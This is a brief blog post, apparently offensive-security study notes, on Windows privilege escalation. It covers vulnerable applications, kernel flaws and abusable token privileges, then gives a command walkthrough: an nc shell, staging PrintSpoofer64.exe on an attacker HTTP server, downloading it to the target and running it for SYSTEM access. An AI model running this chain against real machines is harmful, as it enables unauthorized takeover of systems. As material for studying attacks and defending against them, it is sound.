---
layout: post
title: Windows Privesc Exploits
titledate: 09/16/23
tags: ["infosec","offsec", "privesc", "powershell", "exploit"]
---

#### privilege escalation exploits

1. application - vulnerabilities that are installed and execute with administrative privileges can elevate our privs if they can be exploited

2. windows kernel - vulnerabilities can be leveraged for priv esc

3. windows privileges - non priv users that have certain privileges like SeImpersonatePrivilege may be able to leverage them to perform priv esc. this priv by default gets assigned to members of these groups 
    - Administrators
    - LOCAL SERVICE
    - NETWORK SERVICE
    - SERVICE

some other privileges that can be leveraged to perform priv esc include 
- SeBackupPrivilege
- SeAssignPrimaryToken
- SeLoadDriver
- SeDebug

let's connect to the target

    $ nc 192.168.1.1 4444

check our assigned privs

    C:\> whoami /priv

bc we have the SeImpersonatePrivilege priv assigned we can attempt to utilize a PrintSpooler vulnerability

    $ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

so we retrieve it and host it 

    $ python3 -m http.server 80

then download it on our target

    PS > iwr -uri http://192.168.1.1/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

and finally execute it

    PS > .\PrintSpoofer64.exe -i -c powershell.exe

if the exploit is successful we should hav system privs